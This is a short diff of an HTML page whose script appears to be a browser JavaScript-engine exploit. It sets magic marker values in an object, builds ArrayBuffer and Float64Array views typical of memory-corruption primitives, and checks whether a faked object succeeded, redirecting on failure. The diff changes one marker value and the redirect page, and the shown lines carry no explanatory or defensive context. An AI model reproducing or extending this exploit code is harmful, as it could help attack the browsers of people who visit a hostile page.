@@ -2,7 +2,7 @@
 <script>
   
 var ref = new Array(0x10000);
-const mark_obj = {mark:{},mark1:0x1717dead,obj:{}};
+const mark_obj = {mark:0x13371337,mark1:0x1717dead,obj:{}};
 const FIXED_ARRAY_HEADER_SIZE = 8n;
 var buf = new ArrayBuffer(16);
 var f64 = new Float64Array(buf);
@@ -389,7 +389,7 @@ for (let i = 0; i < 0x200; i++) {
 // alert("dbg");
 if(old_space_array[0].mark == undefined){
   alert("fake failed");
-  location.href = "./bluesheep.html";
+  location.href = "./index.html";
   // window.location.reload();
 }
 else{
